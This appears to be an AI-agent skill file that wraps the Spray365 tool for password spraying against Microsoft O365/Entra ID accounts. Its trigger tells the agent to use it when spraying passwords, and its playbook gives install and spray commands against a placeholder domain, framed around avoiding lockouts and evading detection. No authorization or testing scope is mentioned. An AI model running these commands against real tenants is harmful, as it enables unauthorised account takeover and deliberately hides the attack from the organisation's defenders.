---
name: spray365-o365
description: "Spray365: smart O365 password spraying. Signals: brute force, password spraying, O365 spray, adaptive."
zh-signals: "Spray365: O365 智能喷洒。信号:暴力破解,口令喷射,O365 喷洒,自适应。"
when-to-use: >-
  Use when performing password spraying against Microsoft O365/Entra ID
  accounts, using adaptive throttling to avoid lockouts and detection.
---

# Spray365

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/MarkoH17/Spray365
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install spray365
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `spray365 -d corp.com -u users.txt -p pass.txt` | O365 spray |
| `-d d -u u.txt -p p.txt -a` | Adaptive |
| `-o out.txt` | Output |

## Attack Scenario Playbook

### Smart O365 Spray

```bash
spray365 -d corp.com -u emails.txt -p seasons.txt
# Staggered attempts + rate limiting to evade detection
```

## Notes

By Marko H, O365 password spraying.
